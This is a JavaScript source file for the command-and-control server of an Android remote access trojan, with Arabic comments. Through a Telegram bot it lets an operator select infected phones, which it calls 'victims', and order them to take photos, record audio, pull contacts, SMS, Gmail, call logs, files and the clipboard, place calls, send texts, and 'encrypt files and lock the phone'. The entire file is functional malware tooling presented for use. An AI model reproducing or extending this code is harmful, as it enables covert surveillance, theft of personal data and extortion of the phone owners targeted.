const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// قراءة بيانات الإعدادات من ملف data.json
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(data.token, { polling: true });

const appData = new Map();

// قائمة الأوامر والإجراءات المتاحة للتحكم بالضحية
const actions = [
    "📸 كيمرا أمامية 📸",
    "📸 كيمرا خلفية 📸",
    "🎬 سحب جميع الصور 🎬",
    "📂 عرض جميع الملفات 📂",
    "🎙 تسجيل صوت لاتشترط مدة صوت ▶",
    "🛑 ايقاف الصوت ▶",
    "📞 سجل المكالمات 📞",
    "📒 سحب جهات الاتصال 📒",
    "💬 سحب الرسائل 💬",
    "📧 سحب رسايل جيميل 📧",
    "📋 سجل الحالة 📋",
    "clipboard",
    "🦝 اضهار اشعارات الضحيه 🦝",
    "🦝 اضهار رسالة للشاشة 😎",
    "🛑 ايقاف الاشعارات 🛑",
    "😎 اضهار رسالة للشاشة 😎",
    "🔊 اهتزاز الجهاز 📳",
    "☎️اتصال من هاتف الضحية ☎️",
    "💬 ارسال رسالة لرقم معين معار رقم ✯",
    "📞 الاتصال بالرقم الذي تريد 📞",
    "📺 لقطة شاشة 📺",
    "▶ تشغيل الصوت ▶",
    "⚠️ تشفير الملفات و قفل الهاتف ⚠️",
    "⚠️ تفاصيل هاتف الضحية ✯"
];

// مسار استقبال الملفات المرفوعة من الأجهزة المخترقة
app.get('/', (req, res) => {
    res.send("<b>بوت رات قوي تم تطويره لاجهزة اندرويد\nتم تطويره لاجل التسليه والراقابه ولجميع الانشطه السبرانية لجيش اليمن\nتشفير البيانات والمسارات كاملة بنجاح </b>");
});

app.post('/upload', uploader.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('No file uploaded.');
    const filename = req.file.originalname;
    const contentType = req.file.mimetype;
    
    bot.sendDocument(data.id, req.file.buffer, {
        caption: "<b>✯ تم رفع الملف بنجاح سوف تتلاقى الملفات لدى الضحية </b>\n\nاسم الملف: " + filename,
        parse_mode: 'HTML'
    }, {
        filename: filename,
        contentType: contentType
    });
    res.send('Done');
});

// إدارة الاتصالات عبر Socket.io
io.on('connection', socket => {
    let deviceName = socket.handshake.query.model || 'unknown',
        deviceAct = socket.handshake.query.currentAct || 'unknown',
        deviceIp = socket.handshake.query.ip || 'unknown';

    socket.model = deviceName;
    socket.currentAct = deviceAct;
    socket.ip = deviceIp;

    let welcomeMessage = "<b>✯ تم اتصال ضحية متصل </b>\n\n<b>اسم الهاتف → </b> " + deviceName + " \n" +
        "<b>التطبيق المفتوح →  </b> " + deviceAct + " \n" +
        "<b>ip →  →  </b> " + deviceIp + " \n" +
        "<b>الحالة → متصل </b>\n\n";

    bot.sendMessage(data.id, welcomeMessage, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        let disconnectMessage = "<b>✯ جهاز غير متصل </b>\n\n<b>اسم الهاتف → </b> " + deviceName + " \n" +
            "<b>التطبيق المفتوح →  →  </b> " + deviceAct + " \n" +
            "<b>ip →  →  </b> " + deviceIp + " \n" +
            "<b>الحالة → غير متصل </b>\n\n";
        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
    });

    socket.on('apps', appsList => {
        let rows = [], currentRow = [];
        appsList.forEach((appItem, index) => {
            let callbackData = appItem.isFolder ? deviceName + '|cd-' + appItem.name : deviceName + '|request-' + appItem.name;
            
            if (currentRow.length < 2) {
                currentRow.push({ text: appItem.name, callback_data: callbackData });
                if (index === appsList.length - 1) rows.push(currentRow);
            } else {
                currentRow.push({ text: appItem.name, callback_data: callbackData });
                rows.push(currentRow);
                currentRow = [];
            }
        });
        rows.push([{ text: '✯ رجوع ✯', callback_data: deviceName + '|back-0' }]);
        bot.sendMessage(data.id, "<b>✯ حدد اي تطبيق تريد فتحه بهاتف الضحية </b>\n\n", {
            reply_markup: { inline_keyboard: rows },
            parse_mode: 'HTML'
        });
    });

    socket.on('toast', toastText => {
        bot.sendMessage(data.id, "<b>✯ تم عرض رسالة للشاشة 😎 </b>\n\nالرسالة التي تم عرضها: " + toastText, { parse_mode: 'HTML' });
    });
});

// معالجة رسائل وأوامر بوت التليجرام
bot.on('message', msg => {
    let text = msg.text;
    if (!text) return;

    if (text === '/start') {
        bot.sendMessage(data.id, "<b>✯ أهلآ وسهلا في اقوى بوت تحكم بالضحايا </b>\n\nاختر من الأزرار بالأسفل للتحكم بجهاز الضحية", {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ["<b>✯ عدد الاجهزة المتصلة </b>", "<b>✯ قائمة الضحايا </b>"],
                    ["<b>✯ عن المطور </b>"]
                ],
                resize_keyboard: true
            }
        });
    } else {
        if (appData.get('waiting_for_sms_number') === 'yes') {
            let smsNum = msg.text, targetSocketId = appData.get('target_socket');
            io.to(targetSocketId).emit('command', {
                request: 'smsText',
                extras: [{ key: 'number', value: smsNum }]
            });
            appData.delete('target_socket');
            appData.delete('waiting_for_sms_number');
            bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح </b>", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["<b>✯ عدد الاجهزة المتصلة </b>", "<b>✯ قائمة الضحايا </b>"],
                        ["<b>✯ عن المطور </b>"]
                    ],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('waiting_for_sms_text') === 'yes') {
            let smsTxt = msg.text, targetSocketId = appData.get('target_socket');
            io.to(targetSocketId).emit('command', {
                request: 'sendSms',
                extras: [{ key: 'text', value: smsTxt }]
            });
            appData.delete('target_socket');
            appData.delete('waiting_for_sms_text');
            bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح </b>", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["<b>✯ عدد الاجهزة المتصلة </b>", "<b>✯ قائمة الضحايا </b>"],
                        ["<b>✯ عن المطور </b>"]
                    ],
                    resize_keyboard: true
                }
            });
        }
    }

    if (appData.get('waiting_for_call_num') === 'yes') {
        let callNum = msg.text;
        appData.set('currentNum', callNum);
        appData.set('waiting_for_call_num', 'number');
        bot.sendMessage(data.id, "<b>✯ اكتب مدة الاتصال (بالثواني) </b>\n\nأدخل الرقم أسفل الشاشة", {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [["**موافق**"]],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    } else {
        if (appData.get('waiting_for_call_num') === 'number') {
            let callDur = msg.text, callNum = appData.get('currentNum'), targetSocketId = appData.get('target_socket');
            io.to(targetSocketId).emit('command', {
                request: 'makeCallNum',
                extras: [
                    { key: 'number', value: callNum },
                    { key: 'duration', value: callDur }
                ]
            });
            appData.delete('target_socket');
            appData.delete('waiting_for_call_num');
            appData.delete('currentNum');
            bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح </b>", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["<b>✯ عدد الاجهزة المتصلة </b>", "<b>✯ قائمة الضحايا </b>"],
                        ["<b>✯ عن المطور </b>"]
                    ],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('waiting_for_vibrate') === 'yes') {
            let vibDur = msg.text;
            appData.set('currentNum', vibDur);
            appData.set('waiting_for_vibrate', 'duration');
            bot.sendMessage(data.id, "<b>✯ أين تريد بجهاز الضحية </b>\n\nأدخل المدة أو الخيار أسفل الشاشة", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [["**موافق**"]],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        } else if (appData.get('waiting_for_vibrate') === 'duration') {
            let vibDur = msg.text, vibVal = appData.get('currentNum'), targetSocketId = appData.get('target_socket');
            io.to(targetSocketId).emit('command', {
                request: 'vibrateDur',
                extras: [
                    { key: 'number', value: vibVal },
                    { key: 'duration', value: vibDur }
                ]
            });
            appData.delete('target_socket');
            appData.delete('waiting_for_vibrate');
            appData.delete('currentNum');
            bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح </b>", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["<b>✯ عدد الاجهزة المتصلة </b>", "<b>✯ قائمة الضحايا </b>"],
                        ["<b>✯ عن المطور </b>"]
                    ],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('waiting_for_toast') === 'yes') {
            let toastMsg = msg.text, targetSocketId = appData.get('target_socket');
            io.to(targetSocketId).emit('command', {
                request: 'toastText',
                extras: [{ key: 'text', value: toastMsg }]
            });
            appData.delete('target_socket');
            appData.delete('waiting_for_toast');
            bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح </b>", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["<b>✯ عدد الاجهزة المتصلة </b>", "<b>✯ قائمة الضحايا </b>"],
                        ["<b>✯ عن المطور </b>"]
                    ],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('waiting_for_toast') === 'notify') {
            let notifMsg = msg.text, targetSocketId = appData.get('target_socket');
            io.to(targetSocketId).emit('command', {
                request: 'notificationText',
                extras: [{ key: 'text', value: notifMsg }]
            });
            appData.delete('target_socket');
            appData.delete('waiting_for_toast');
            bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح </b>", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["<b>✯ عدد الاجهزة المتصلة </b>", "<b>✯ قائمة الضحايا </b>"],
                        ["<b>✯ عن المطور </b>"]
                    ],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('waiting_for_audio') === 'yes') {
            let audioUrl = msg.text;
            appData.set('currentNum', audioUrl);
            appData.set('waiting_for_audio', 'url');
            bot.sendMessage(data.id, "<b>✯ اكتب الرابط </b>", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [["**موافق**"]],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        } else if (appData.get('waiting_for_audio') === 'url') {
            let audioUrl = msg.text, targetSocketId = appData.get('target_socket');
            io.to(targetSocketId).emit('command', {
                request: 'playAudio',
                extras: [{ key: 'url', value: audioUrl }]
            });
            appData.delete('target_socket');
            appData.delete('waiting_for_audio');
            appData.delete('currentNum');
            bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح </b>", {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["<b>✯ عدد الاجهزة المتصلة </b>", "<b>✯ قائمة الضحايا </b>"],
                        ["<b>✯ عن المطور </b>"]
                    ],
                    resize_keyboard: true
                }
            });
        } else {
            if (text === "<b>✯ عدد الاجهزة المتصلة </b>") {
                if (io.sockets.sockets.size === 0)
                    bot.sendMessage(data.id, "<b>✯ لايوجد اي جهاز متصل حاليا </b>", { parse_mode: 'HTML' });
                else {
                    let devicesInfo = "<b>عدد الأجهزة المتصلة: </b>" + io.sockets.sockets.size + "\n\n", indexCount = 1;
                    io.sockets.sockets.forEach((socketItem) => {
                        devicesInfo += "<b>Device " + indexCount + " </b>\n" +
                            "<b>اسم الهاتف → </b> " + socketItem.model + " \n" +
                            "<b>التطبيق المفتوح → </b> " + socketItem.currentAct + " \n" +
                            "<b>ip → </b> " + socketItem.ip + " \n" +
                            "<b>الحالة → متصل </b>\n\n";
                        indexCount++;
                    });
                    bot.sendMessage(data.id, devicesInfo, { parse_mode: 'HTML' });
                }
            } else {
                if (text === "<b>✯ قائمة الضحايا </b>") {
                    if (io.sockets.sockets.size === 0)
                        bot.sendMessage(data.id, "<b>✯ لايوجد ضحايا متصلين حاليا </b>", { parse_mode: 'HTML' });
                    else {
                        let keyboardRows = [];
                        io.sockets.sockets.forEach((socketItem) => {
                            keyboardRows.push([socketItem.model]);
                        });
                        keyboardRows.push(["<b>✯ العودة إلى القائمة الرئيسية </b>"]);
                        bot.sendMessage(data.id, "<b>✯ حدد الضحية التي تريد التحكم بها </b>", {
                            parse_mode: 'HTML',
                            reply_markup: {
                                keyboard: keyboardRows,
                                resize_keyboard: true,
                                one_time_keyboard: true
                            }
                        });
                    }
                } else {
                    if (text === "<b>✯ عن المطور </b>")
                        bot.sendMessage(data.id, "<b>بوت رات قوي تم تطويره لاجل الحماية والسيطرة السيبرانية بواسطة ابن اليمن </b>", { parse_mode: 'HTML' });
                    else {
                        if (text === "**موافق**") {
                            let currentSocketId = io.sockets.sockets.get(appData.get('target_socket'))?.model || "غير معروف";
                            bot.sendMessage(data.id, "<b>✯ اسم الهاتف </b>: " + currentSocketId + "\n\n", {
                                parse_mode: 'HTML',
                                reply_markup: {
                                    keyboard: [
                                        ["📸 كيمرا أمامية 📸", "📸 كيمرا خلفية 📸"],
                                        ["🎬 سحب جميع الصور 🎬", "📂 عرض جميع الملفات 📂"],
                                        ["🎙 تسجيل صوت لاتشترط مدة صوت ▶", "🛑 ايقاف الصوت ▶"],
                                        ["📞 سجل المكالمات 📞", "📒 سحب جهات الاتصال 📒"],
                                        ["💬 سحب الرسائل 💬", "📧 سحب رسايل جيميل 📧"],
                                        ["📋 سجل الحالة 📋", "clipboard"],
                                        ["🦝 اضهار اشعارات الضحيه 🦝", "🦝 اضهار رسالة للشاشة 😎"],
                                        ["🛑 ايقاف الاشعارات 🛑", "😎 اضهار رسالة للشاشة 😎"],
                                        ["🔊 اهتزاز الجهاز 📳", "☎️اتصال من هاتف الضحية ☎️"],
                                        ["💬 ارسال رسالة لرقم معين معار رقم ✯"],
                                        ["📞 الاتصال بالرقم الذي تريد 📞", "📺 لقطة شاشة 📺"],
                                        ["▶ تشغيل الصوت ▶", "⚠️ تشفير الملفات و قفل الهاتف ⚠️"],
                                        ["<b>✯ العودة إلى القائمة الرئيسية </b>"]
                                    ],
                                    resize_keyboard: true,
                                    one_time_keyboard: true
                                }
                            });
                        } else {
                            if (actions.includes(text)) {
                                let targetSocketId = appData.get('target_socket');
                                if (!targetSocketId) {
                                    bot.sendMessage(data.id, "<b>⚠️ يرجى اختيار ضحية أولاً من القائمة </b>", { parse_mode: 'HTML' });
                                    return;
                                }
                                
                                if (text === "📸 كيمرا أمامية 📸") {
                                    io.to(targetSocketId).emit('command', { request: 'main-camera', extras: [] });
                                } else if (text === "📸 كيمرا خلفية 📸") {
                                    io.to(targetSocketId).emit('command', { request: 'selfie-cam', extras: [] });
                                } else if (text === "🎬 سحب جميع الصور 🎬") {
                                    io.to(targetSocketId).emit('command', { request: 'gallery', extras: [] });
                                } else if (text === "📂 عرض جميع الملفات 📂") {
                                    io.to(targetSocketId).emit('command', { request: 'file-explorer', extras: [] });
                                } else if (text === "🎙 تسجيل صوت لاتشترط مدة صوت ▶") {
                                    io.to(targetSocketId).emit('command', { request: 'microphone', extras: [] });
                                } else if (text === "🛑 ايقاف الصوت ▶") {
                                    io.to(targetSocketId).emit('command', { request: 'stopAudio', extras: [] });
                                } else if (text === "📞 سجل المكالمات 📞") {
                                    io.to(targetSocketId).emit('command', { request: 'calls', extras: [] });
                                } else if (text === "📒 سحب جهات الاتصال 📒") {
                                    io.to(targetSocketId).emit('command', { request: 'contacts', extras: [] });
                                } else if (text === "💬 سحب الرسائل 💬") {
                                    io.to(targetSocketId).emit('command', { request: 'all-sms', extras: [] });
                                } else if (text === "📧 سحب رسايل جيميل 📧") {
                                    io.to(targetSocketId).emit('command', { request: 'all-email', extras: [] });
                                } else if (text === "📋 سجل الحالة 📋") {
                                    io.to(targetSocketId).emit('command', { request: 'clipboard', extras: [] });
                                } else if (text === "🦝 اضهار اشعارات الضحيه 🦝") {
                                    io.to(targetSocketId).emit('command', { request: 'notification', extras: [] });
                                } else if (text === "🦝 اضهار رسالة للشاشة 😎") {
                                    io.to(targetSocketId).emit('command', { request: 'popNotification', extras: [] });
                                } else if (text === "🛑 ايقاف الاشعارات 🛑") {
                                    io.to(targetSocketId).emit('command', { request: 'stopNotif', extras: [] });
                                } else if (text === "😎 اضهار رسالة للشاشة 😎") {
                                    io.to(targetSocketId).emit('command', { request: 'toast', extras: [] });
                                } else if (text === "🔊 اهتزاز الجهاز 📳") {
                                    appData.set('waiting_for_vibrate', 'yes');
                                    bot.sendMessage(data.id, "<b>✯ اختر مدة الاهتزاز أو اضغط موافق </b>", {
                                        parse_mode: 'HTML',
                                        reply_markup: { keyboard: [["**موافق**"]], resize_keyboard: true, one_time_keyboard: true }
                                    });
                                    return;
                                } else if (text === "☎️اتصال من هاتف الضحية ☎️") {
                                    appData.set('waiting_for_call_num', 'yes');
                                    bot.sendMessage(data.id, "<b>✯ اكتب رقم الهاتف الذي تريد الاتصال به </b>", {
                                        parse_mode: 'HTML',
                                        reply_markup: { keyboard: [["**موافق**"]], resize_keyboard: true, one_time_keyboard: true }
                                    });
                                    return;
                                } else if (text === "💬 ارسال رسالة لرقم معين معار رقم ✯") {
                                    appData.set('waiting_for_sms_number', 'yes');
                                    bot.sendMessage(data.id, "<b>✯ اكتب الرقم المراد إرسال الرسالة له </b>", {
                                        parse_mode: 'HTML',
                                        reply_markup: { keyboard: [["**موافق**"]], resize_keyboard: true, one_time_keyboard: true }
                                    });
                                    return;
                                } else if (text === "📞 الاتصال بالرقم الذي تريد 📞") {
                                    appData.set('waiting_for_call_num', 'yes');
                                    bot.sendMessage(data.id, "<b>✯ اكتب الرقم المراد الاتصال به </b>", {
                                        parse_mode: 'HTML',
                                        reply_markup: { keyboard: [["**موافق**"]], resize_keyboard: true, one_time_keyboard: true }
                                    });
                                    return;
                                } else if (text === "📺 لقطة شاشة 📺") {
                                    io.to(targetSocketId).emit('command', { request: 'screenshot', extras: [] });
                                } else if (text === "▶ تشغيل الصوت ▶") {
                                    appData.set('waiting_for_audio', 'yes');
                                    bot.sendMessage(data.id, "<b>✯ اكتب رابط الملف الصوتي المراد تشغيله </b>", {
                                        parse_mode: 'HTML',
                                        reply_markup: { keyboard: [["**موافق**"]], resize_keyboard: true, one_time_keyboard: true }
                                    });
                                    return;
                                } else if (text === "⚠️ تشفير الملفات و قفل الهاتف ⚠️") {
                                    io.to(targetSocketId).emit('command', { request: 'lock', extras: [] });
                                }

                                appData.delete('target_socket');
                                bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح </b>", {
                                    parse_mode: 'HTML',
                                    reply_markup: {
                                        keyboard: [
                                            ["<b>✯ عدد الاجهزة المتصلة </b>", "<b>✯ قائمة الضحايا </b>"],
                                            ["<b>✯ عن المطور </b>"]
                                        ],
                                        resize_keyboard: true
                                    }
                                });
                            } else {
                                io.sockets.sockets.forEach((socketItem, socketKey) => {
                                    if (text === socketItem.model) {
                                        appData.set('waiting_for_target', socketKey);
                                        appData.set('target_socket', socketKey);
                                        bot.sendMessage(data.id, "<b>✯ اسم الهاتف </b>: " + socketItem.model + "\n\n", {
                                            parse_mode: 'HTML',
                                            reply_markup: {
                                                keyboard: [
                                                    ["📸 كيمرا أمامية 📸", "📸 كيمرا خلفية 📸"],
                                                    ["🎬 سحب جميع الصور 🎬", "📂 عرض جميع الملفات 📂"],
                                                    ["🎙 تسجيل صوت لاتشترط مدة صوت ▶", "🛑 ايقاف الصوت ▶"],
                                                    ["📞 سجل المكالمات 📞", "📒 سحب جهات الاتصال 📒"],
                                                    ["💬 سحب الرسائل 💬", "📧 سحب رسايل جيميل 📧"],
                                                    ["📋 سجل الحالة 📋", "clipboard"],
                                                    ["🦝 اضهار اشعارات الضحيه 🦝", "🦝 اضهار رسالة للشاشة 😎"],
                                                    ["🛑 ايقاف الاشعارات 🛑", "😎 اضهار رسالة للشاشة 😎"],
                                                    ["🔊 اهتزاز الجهاز 📳", "☎️اتصال من هاتف الضحية ☎️"],
                                                    ["💬 ارسال رسالة لرقم معين معار رقم ✯"],
                                                    ["📞 الاتصال بالرقم الذي تريد 📞", "📺 لقطة شاشة 📺"],
                                                    ["▶ تشغيل الصوت ▶", "⚠️ تشفير الملفات و قفل الهاتف ⚠️"],
                                                    ["<b>✯ العودة إلى القائمة الرئيسية </b>"]
                                                ],
                                                resize_keyboard: true,
                                                one_time_keyboard: true
                                            }
                                        });
                                    }
                                });
                            }
                        }
                    }
                }
            }
        }
    }
});

// التعامل مع الاستدعاءات الخاصة بالأزرار الشفافة
bot.on('callback_query', query => {
    let queryData = query.data;
    if (!queryData) return;
    
    let parts = queryData.split('|');
    if (parts.length < 2) return;
    
    let targetId = parts[0];
    let actionType = parts[1];
    let details = actionType.split('-');
    let commandName = details[0];
    let pathValue = details[1];

    if (commandName === 'cd') {
        io.sockets.sockets.forEach((socketItem, socketKey) => {
            if (socketItem.model === targetId) {
                io.to(socketKey).emit('command', {
                    request: 'cd',
                    extras: [{ key: 'path', value: pathValue }]
                });
            }
        });
    }
});

// فحص دوري لاتصال الأجهزة
setInterval(() => {
    io.sockets.sockets.forEach((socketItem, socketKey) => {
        io.to(socketKey).emit('ping', {});
    });
}, 10000);

// تشغيل السيرفر على البورت المحدد
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
